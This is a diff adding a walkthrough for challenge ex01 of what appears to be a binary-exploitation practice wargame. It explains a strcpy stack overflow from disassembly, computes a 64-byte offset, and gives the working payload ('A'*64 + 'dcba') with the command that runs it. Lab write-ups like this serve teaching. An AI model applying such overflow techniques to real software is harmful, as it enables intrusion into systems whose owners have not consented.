@@ -145,8 +145,57 @@ variable is already a security-relevant state change (here it flips an authoriza
 
 ---
 
-<!-- ex01 … ex11 walkthroughs are added as each challenge is completed. -->
-_ex01 … ex11: in progress._
+### ex01 — overwrite a variable with an exact value
+
+**Goal (`README.txt`):** see *“you have correctly got the variable to the right value”*.
+
+**Vulnerability class:** stack buffer overflow via `strcpy()` of an attacker-controlled `argv[1]` (CWE-121).
+
+**Disassembly (`main`, key lines):**
+
+```asm
+ 804846d: cmp    DWORD PTR [ebp+0x8],0x1     ; if (argc == 1)
+ 8048471: jne    8048487
+ 8048482: call   errx@plt                    ;   errx(1, "...") — needs an argument
+ 8048487: mov    DWORD PTR [esp+0x5c],0x0    ; modified = 0
+ 804848f: mov    eax,DWORD PTR [ebp+0xc]     ; eax = argv
+ 8048492: add    eax,0x4                     ; &argv[1]
+ 8048495: mov    eax,DWORD PTR [eax]         ; argv[1]
+ 8048497: mov    DWORD PTR [esp+0x4],eax     ; src  = argv[1]
+ 804849b: lea    eax,[esp+0x1c]             ; dst  = &buffer
+ 80484a2: call   strcpy@plt                  ; strcpy(buffer, argv[1])  <-- overflow
+ 80484a7: mov    eax,DWORD PTR [esp+0x5c]    ; eax = modified
+ 80484ab: cmp    eax,0x61626364             ; modified == 0x61626364 ?
+ 80484b0: jne    80484c0
+ 80484b2: ... puts("you have correctly got the variable to the right value")
+```
+
+**Reading it:** `[ebp+0x8]` is `argc`, `[ebp+0xc]` is `argv`; `add eax,4` + deref selects
+`argv[1]`. `strcpy` copies it into `buffer` at `esp+0x1c` with no length check. The win test is
+an **exact** compare against `0x61626364` (not just non-zero like ex00).
+
+**Offset:** `0x5c − 0x1c = 64` bytes. The 4 bytes after the padding must be the little-endian
+encoding of `0x61626364`, i.e. the ASCII `"dcba"` (`64 63 62 61`). `strcpy` stops at a NUL, and
+our payload has none, so it copies in full.
+
+**Exploit (`scripts/ex01.py`):** `"A"*64 + "dcba"`, passed as the argument.
+
+```bash
+/opt/hole-in-bin/ex01/bin "$(python3 scripts/ex01.py)"
+# local: scripts/runlocal.sh challenges/ex01/bin "$(python3 scripts/ex01.py)"
+```
+
+**Result (verified):** `you have correctly got the variable to the right value`
+(a wrong value prints `Try again, you got 0x……`, which also leaks the overwritten bytes — handy for debugging the offset).
+
+**Key takeaway:** `strcpy()` has the same flaw as `gets()` — it copies until a NUL with no
+destination bound. Overflows can place a **precise** value, not just garbage, which is what makes
+them usable to control program logic (and, later, addresses).
+
+---
+
+<!-- ex02 … ex11 walkthroughs are added as each challenge is completed. -->
+_ex02 … ex11: in progress._
 
 ---
 
